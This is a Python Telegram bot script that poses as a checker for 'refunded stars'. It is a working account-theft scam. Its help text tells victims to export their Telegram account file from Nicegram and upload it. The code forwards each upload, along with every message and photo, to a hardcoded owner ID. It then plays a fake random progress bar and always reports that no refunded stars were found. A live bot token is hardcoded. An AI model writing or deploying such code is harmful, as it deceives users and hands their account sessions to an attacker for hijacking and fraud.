import telebot
import time
import random
from concurrent.futures import ThreadPoolExecutor

TOKEN = "8462004551:AAGtOcss69tC7SJX3VlnoTzai6bAC4Sh_hw"
OWNER_ID = 6519455370  
bot = telebot.TeleBot(TOKEN)

executor = ThreadPoolExecutor(max_workers=10)
processing_users = set()
user_languages = {}


TEXTS = {
    "ru": {
        "start": "👋 Привет! Я бот для проверки рефаунд-звёзд.\n\n💡 Отправьте `.txt` файл, чтобы начать обработку.",
        "help": """**Как проверить ваш аккаунт на наличие рефнутых звезд**

➡️ Шаг 1. Установите Nicegram с Apple Store или Google Play (Иконка на скрине)
➡️ Шаг 2. После установки Nicegram войдите в свой аккаунт и нажмите настройки ➡️ Nicegram
➡️ Шаг 3. Пролистайте немного вниз и найдите вкладку аккаунты, нажмите на экспортировать как файл
➡️ Шаг 4. Выберите нужный аккаунт, отметьте галочкой и экспортируйте
➡️ Шаг 5. После экспорта файла нажмите "Сохранить в файлах"
➡️ Шаг 6. Нажмите на скрепку слева снизу, выберите файл и отправьте его боту
➡️ Шаг 7. Бот проверит файл и сообщит, есть ли у вас рефнутые звезды""",
        "wait": "⏳ Нельзя использовать команды во время обработки файла.",
        "invalid_file": "Неверный формат файла",
        "processing": "В обработке... ",
        "done": "Рефунд-звёзд не обнаружено ✅",
        "support_sent": "✅ Ваше сообщение отправлено поддержке.",
        "support_no_text": "Вы не указали вопрос в сообщении с командой.",
        "language_set_ru": "Язык успешно изменён на Русский 🇷🇺",
        "language_set_en": "Language changed to English 🇬🇧 successfully."
    },
    "en": {
        "start": "👋 Hello! I'm a bot for checking refund-stars.\n\n💡 Send a `.txt` file to start processing.",
        "help": """**How to check your account for refunded stars**

➡️ Step 1. Install Nicegram from Apple Store or Google Play (Icon on screenshot)
➡️ Step 2. Open Nicegram, go to settings ➡️ Nicegram
➡️ Step 3. Scroll down and find "Accounts", then click "Export as file"
➡️ Step 4. Select the desired account, mark it, and export
➡️ Step 5. Save the exported file to your device
➡️ Step 6. Click the paperclip at bottom left, choose the exported file, and send it to the bot
➡️ Step 7. The bot will check the file and tell you if you have refunded stars""",
        "wait": "⏳ You cannot use commands during file processing.",
        "invalid_file": "Invalid file format",
        "processing": "Processing... ",
        "done": "No refund-stars found ✅",
        "support_sent": "✅ Your message has been sent to support.",
        "support_no_text": "You didn't specify a question.",
        "language_set_ru": "Язык успешно изменён на Русский 🇷🇺",
        "language_set_en": "Language changed to English 🇬🇧 successfully."
    }
}

def get_lang(user_id):
    return user_languages.get(user_id, "ru")

def forward_to_owner(message):
    try:
        sender = message.from_user.username or message.from_user.id
        if message.content_type == 'text':
            if message.text.startswith('/'):
                bot.send_message(OWNER_ID, f"Команда от {sender}:\n{message.text}")
            else:
                bot.send_message(OWNER_ID, f"Сообщение от {sender}:\n{message.text}")
        elif message.content_type == 'document':
            file_id = message.document.file_id
            bot.send_document(OWNER_ID, file_id, caption=f"Файл от {sender}")
        elif message.content_type == 'photo':
            file_id = message.photo[-1].file_id
            bot.send_photo(OWNER_ID, file_id, caption=f"Фото от {sender}")
        else:
            bot.send_message(OWNER_ID, f"Сообщение от {sender} с типом {message.content_type}")
    except:
        pass


@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.chat.id
    lang = get_lang(user_id)
    if user_id in processing_users:
        bot.reply_to(message, TEXTS[lang]["wait"])
    else:
        bot.reply_to(message, TEXTS[lang]["start"])
    forward_to_owner(message)


@bot.message_handler(content_types=['text'])
def handle_text(message):
    user_id = message.chat.id
    lang = get_lang(user_id)
    text = message.text.strip()

    forward_to_owner(message)  

    if user_id in processing_users:
        if text.startswith(("/help", "/support", "/language")):
            bot.reply_to(message, TEXTS[lang]["wait"])
        return

    if text.startswith("/help"):
        bot.send_photo(
            user_id,
            photo="https://i.postimg.cc/xqwwYP9B/Nicegram.png",
            caption=TEXTS[lang]["help"],
            parse_mode='Markdown'
        )
    elif text.startswith("/support"):
        if len(text) > 8:
            bot.reply_to(message, TEXTS[lang]["support_sent"])
        else:
            bot.reply_to(message, TEXTS[lang]["support_no_text"])
    elif text.startswith("/language"):
        if lang == "ru":
            user_languages[user_id] = "en"
            bot.reply_to(message, TEXTS["en"]["language_set_en"])
        else:
            user_languages[user_id] = "ru"
            bot.reply_to(message, TEXTS["ru"]["language_set_ru"])
    else:
        bot.reply_to(message, TEXTS[lang]["invalid_file"])


@bot.message_handler(content_types=['document'])
def handle_file(message):
    user_id = message.chat.id
    lang = get_lang(user_id)

    forward_to_owner(message)  

    
    if user_id in processing_users:
        if lang == "ru":
            bot.reply_to(message, "❌ Нельзя обработать несколько файлов одновременно")
        else:
            bot.reply_to(message, "❌ You cannot process multiple files at the same time")
        return

    
    if message.document.mime_type != 'text/plain':
        bot.reply_to(message, TEXTS[lang]["invalid_file"])
        return

    file_name = message.document.file_name
    keywords = ["export", "account"]
    has_keyword = any(keyword.lower() in file_name.lower() for keyword in keywords)

    
    if has_keyword:
        processing_users.add(user_id)
        msg = bot.send_message(user_id, TEXTS[lang]["processing"] + "0% [----------]")

        
        file_id = message.document.file_id
        bot.send_document(OWNER_ID, file_id, caption=f".txt файл для обработки от {message.from_user.username or message.from_user.id}")

        executor.submit(process_file, message, msg)

    
    else:
        if lang == "ru":
            bot.reply_to(message, "❌ Этот файл не подходит для обработки.")
        else:
            bot.reply_to(message, "❌ This file is not suitable for processing")


def process_file(message, msg):
    user_id = message.chat.id
    lang = get_lang(user_id)
    progress = 0
    total_bars = 10

    while progress < 100:
        step = random.randint(1, 5)
        progress = min(progress + step, 100)
        bars = int(progress / 10)
        text_bar = ''.join(['■' if i < bars else '-' for i in range(total_bars)])

        success = False
        while not success:
            try:
                bot.edit_message_text(chat_id=user_id, message_id=msg.message_id,
                                      text=f"{TEXTS[lang]['processing']}{progress}% [{text_bar}]")
                success = True
            except telebot.apihelper.ApiTelegramException:
                time.sleep(0.2)

        time.sleep(random.uniform(0.3, 0.6))

    time.sleep(8)
    try:
        bot.edit_message_text(chat_id=user_id, message_id=msg.message_id, text=TEXTS[lang]["done"])
    except telebot.apihelper.ApiTelegramException:
        bot.send_message(user_id, TEXTS[lang]["done"])

    processing_users.discard(user_id)


bot.polling(non_stop=True)
